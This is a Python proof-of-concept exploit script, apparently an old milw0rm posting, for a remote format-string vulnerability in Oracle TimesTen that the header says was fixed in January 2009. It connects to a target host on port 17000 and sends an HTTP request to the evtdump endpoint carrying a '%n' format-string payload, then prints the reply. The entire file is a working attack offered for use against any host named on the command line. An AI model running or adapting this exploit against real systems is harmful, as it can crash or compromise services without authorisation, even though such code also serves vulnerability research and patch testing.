#!/usr/bin/python

"""
Oracle TimesTen Remote Format String (Fixed in Oracle CPU Jan 2009
Copyright (c) Joxean Koret 2009
"""

import sys
import socket

def testPoc(host):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 17000))
	buf = "GET evtdump?msg=AAAA%25n HTTP/1.0\r\n\r\n"
	print "Sending: %s" % buf
	s.send(buf)
	print s.recv(4096)
	s.close()

if __name__ == "__main__":
	if len(sys.argv) == 1:
		print "Usage:", sys.argv[0], "<target host>"
		print
		sys.exit(1)
	else:
		testPoc(sys.argv[1])

# milw0rm.com [2009-01-14]
